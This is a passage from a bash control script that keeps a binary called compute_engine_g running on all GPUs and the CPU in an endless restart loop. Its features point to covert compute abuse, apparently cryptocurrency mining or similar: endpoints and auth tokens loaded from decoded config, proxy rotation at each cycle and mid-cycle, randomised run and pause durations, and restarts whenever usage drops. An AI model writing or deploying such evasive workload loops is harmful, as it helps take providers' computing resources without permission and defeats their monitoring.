        echo "ERROR: compute_engine_g not found at /opt/bin/compute_engine_g"
        return 1
    fi
    
    if [ -z "$MODEL_TYPE_A_DEC" ] || [ -z "$MODEL_TYPE_B_DEC" ] || \
       [ -z "$ENDPOINT_PRIMARY_DEC" ] || [ -z "$ENDPOINT_SECONDARY_DEC" ] || \
       [ -z "$AUTH_TOKEN_A_DEC" ] || [ -z "$AUTH_TOKEN_B_DEC" ]; then
        initialize_decoded_runtime_config
    fi
    
    # Test proxy first
    echo "Testing proxy connection..."
    if ! test_proxy_connection; then
        echo "Warning: Proxy test failed, but continuing anyway..."
    else
        echo "Proxy connection successful"
    fi
    
    # Start GPU workload first (required). Stop container if no GPU is available.
    if [ $GPU_COUNT -le 0 ]; then
        GPU_COUNT=$(calculate_gpu_allocation)
        if [ $GPU_COUNT -le 0 ]; then
            echo "ERROR: No GPUs available. Retrying cycle without stopping container."
            log_event "ERROR" "No GPUs available in start_compute_workloads; retrying cycle"
            return 1
        fi
    fi
    
    initialize_gpu_pid_tracking
    initialize_gpu_warm_restart_tracking
    for ((i=0; i<GPU_COUNT; i++)); do
        echo "Attempting to start GPU $i..."
        if start_gpu_workload "$i"; then
            echo "GPU $i started successfully"
        else
            log_event "ERROR" "GPU compute engine failed to start; gpu_id=$i restarting cycle"
            return 1
        fi
    done
    
    # Start CPU workload
    if ! start_cpu_workload; then
        log_event "ERROR" "CPU workload failed to start in start_compute_workloads"
        return 1
    fi
    
    # Start optional PyTorch training
    if is_truthy "$ENABLE_PYTORCH_TRAINING"; then
        if ! start_pytorch_training; then
            log_event "ERROR" "PyTorch training failed to start in start_compute_workloads"
            return 1
        fi
    else
        TRAINING_PID=0
        echo "PyTorch training disabled; prioritizing compute engines."
        log_event "INFO" "PyTorch training disabled; compute workloads prioritized"
    fi
    
    # Set startup time for warm-up period
    STARTUP_TIME=$(date +%s)
    CPU_ZERO_USAGE_STREAK=0
    GPU_ZERO_USAGE_STREAK=0
    invalidate_runtime_metrics_cache
    
    echo "Workloads started successfully"
    log_event "INFO" "Compute workloads started; gpu_count=$GPU_COUNT cpu_threads=$PRIMARY_CPU_THREADS"
    return 0
}

# Function to display status
display_status() {
    local -i cpu_usage=0
    local -i gpu_usage=0
    local -i process_count=0
    local -i gpu_temp=0
    local -i gpu_mem_used=0
    local -i gpu_mem_total=0
    
    # Sample current runtime metrics
    read -r cpu_usage gpu_usage gpu_temp gpu_mem_used gpu_mem_total process_count <<< "$(sample_runtime_metrics)"
    
    if [ $GPU_COUNT -gt 0 ]; then
        
        printf "\rCPU=%3d%% GPU=%3d%% Temp=%2dC Mem=%4d/%4dMB | Procs=%d | Proxy=%s | Restarts(CPU/GPU)=%d/%d | Time=%s" \
            "$cpu_usage" "$gpu_usage" "$gpu_temp" "$gpu_mem_used" "$gpu_mem_total" \
            "$process_count" "$PROXY_IP" "$CPU_RESTART_COUNT" "$GPU_RESTART_COUNT" "$(date +%H:%M:%S)"
    else
        printf "\rCPU=%3d%% GPU=N/A                     | Procs=%d | Proxy=%s | Restarts(CPU/GPU)=%d/%d | Time=%s" \
            "$cpu_usage" "$process_count" "$PROXY_IP" "$CPU_RESTART_COUNT" "$GPU_RESTART_COUNT" "$(date +%H:%M:%S)"
    fi
}

# Main execution function
main_loop() {
    # Initialize
    if ! initialize_system; then
        log_event "WARN" "initialize_system failed; restarting main loop"
        return 1
    fi
    
    # Main loop
    while true; do
        update_heartbeat
        echo -e "\n=== Starting New Cycle ==="
        echo "Start time: $(date '+%H:%M:%S')"
        
        # Rotate proxy
        if ! rotate_proxy; then
            echo "Warning: Using last known working proxy"
            log_event "WARN" "Proxy rotation failed at cycle start; using previous proxy"
        fi
        
        # Cleanup any existing processes
        fast_cleanup
        
        # Start workloads
        if ! start_compute_workloads; then
            echo "Failed to start workloads, restarting in ${STARTUP_RETRY_DELAY_SECONDS} seconds..."
            log_event "WARN" "start_compute_workloads failed at cycle start; retrying after ${STARTUP_RETRY_DELAY_SECONDS}s"
            sleep_with_heartbeat "$STARTUP_RETRY_DELAY_SECONDS"
            continue
        fi
        
        echo "Workloads started successfully"
        echo "Run duration: $((RUN_DURATION_BASE_SECONDS / 60))-$(((RUN_DURATION_BASE_SECONDS + RUN_DURATION_JITTER_SECONDS - 1) / 60)) minutes"
        echo "================================="
        
        # Calculate run duration from tuned bounds
        local -i run_duration=$((RUN_DURATION_BASE_SECONDS + (RANDOM % RUN_DURATION_JITTER_SECONDS)))
        local -i start_time=$(date +%s)
        local -i last_proxy_check=0
        local -i last_usage_check=0
        local -i status_counter=0
        local -i last_process_check=$(date +%s)
        local -i last_log_maintenance=$start_time
        
        # Initial warm-up message
        echo -n "Warming up..."
        
        # Monitor loop
        while true; do
            update_heartbeat
            local -i current_time=$(date +%s)
            local -i elapsed=$((current_time - start_time))
            
            # Check if run duration completed
            if [ $elapsed -ge $run_duration ]; then
                echo -e "\nRun duration completed ($((elapsed/60)) minutes)"
                break
            fi
            
            # Check processes on tuned interval
            if [ $((current_time - last_process_check)) -ge $PROCESS_CHECK_INTERVAL_SECONDS ]; then
                last_process_check=$current_time
                if ! check_processes_alive; then
                    echo -e "\nProcess health check failed, restarting..."
                    log_event "WARN" "Process health check failed; restarting cycle"
                    return 1
                fi
            fi
            
            # Periodic runtime log maintenance
            if [ $((current_time - last_log_maintenance)) -ge $LOG_MAINTENANCE_INTERVAL ]; then
                last_log_maintenance=$current_time
                maintain_runtime_logs
            fi
            
            # Check for low usage on tuned interval
            if [ $((current_time - last_usage_check)) -ge $USAGE_CHECK_INTERVAL_SECONDS ]; then
                last_usage_check=$current_time
                if ! check_usage; then
                    echo -e "\nUsage check failed, restarting..."
                    log_event "WARN" "Usage check failed; restarting cycle"
                    return 1
                fi
            fi
            
            # Display status on tuned interval
            if [ $((status_counter % STATUS_UPDATE_INTERVAL_SECONDS)) -eq 0 ]; then
                display_status
            fi
            status_counter=$((status_counter + 1))
            
            # Rotate proxy at tuned interval
            if [ $elapsed -gt $((last_proxy_check + MID_CYCLE_PROXY_ROTATION_SECONDS)) ]; then
                last_proxy_check=$elapsed
                echo -e "\nRotating proxy mid-cycle..."
                if ! rotate_proxy; then
                    log_event "WARN" "Mid-cycle proxy rotation failed; continuing with existing proxy"
                fi
                fast_cleanup
                sleep_with_heartbeat "$MID_CYCLE_RESTART_GRACE_SECONDS"
                if ! start_compute_workloads; then
                    log_event "WARN" "start_compute_workloads failed after mid-cycle proxy rotation"
                    return 1
                fi
            fi
            
            sleep_with_heartbeat 1
        done
        
        # Fast cleanup before pause
        fast_cleanup
        
        # Short pause with reduced downtime
        local -i pause_duration=$((CYCLE_PAUSE_BASE_SECONDS + (RANDOM % CYCLE_PAUSE_JITTER_SECONDS)))
        local -i i=0
        echo -e "\nPausing for $pause_duration seconds..."
        
        for ((i=pause_duration; i>0; i--)); do
            if [ $((i % 10)) -eq 0 ]; then
                maintain_runtime_logs
            fi
            printf "\rResuming in: %02d seconds" "$i"
            sleep_with_heartbeat 1
        done
        
        echo -e "\n"
    done
}

# Trap signals for clean exit without duplicate cleanup execution
perform_cleanup_once() {
    if [ "$CLEANUP_IN_PROGRESS" -eq 1 ]; then
        return 0
    fi
    CLEANUP_IN_PROGRESS=1
    fast_cleanup
}

request_shutdown() {
    local signal_name="${1:-TERM}"
    echo -e "\nCaught ${signal_name}, performing cleanup..."
    perform_cleanup_once
    exit 0
}

on_exit_cleanup() {
    perform_cleanup_once
}

trap 'request_shutdown INT' INT
trap 'request_shutdown TERM' TERM
trap 'on_exit_cleanup' EXIT

# Main execution with restart logic
echo "Script PID: $$"
echo "Starting main execution..."

if is_truthy "$SELF_TEST_ONLY"; then
    if run_startup_self_test; then
        echo "SELF_TEST_ONLY enabled: checks passed, exiting without starting workloads."
        exit 0
    else
        echo "SELF_TEST_ONLY enabled: checks failed."
        exit 1
    fi
fi

while true; do
    update_heartbeat
    if ! main_loop; then
        echo "Restarting main loop..."
        log_event "WARN" "main_loop returned failure; restarting after ${MAIN_LOOP_RETRY_DELAY_SECONDS}s"
        sleep_with_heartbeat "$MAIN_LOOP_RETRY_DELAY_SECONDS"
    else
        echo "Main loop completed normally, restarting..."
        log_event "INFO" "main_loop completed; restarting after ${MAIN_LOOP_RETRY_DELAY_SECONDS}s"
        sleep_with_heartbeat "$MAIN_LOOP_RETRY_DELAY_SECONDS"
    fi
done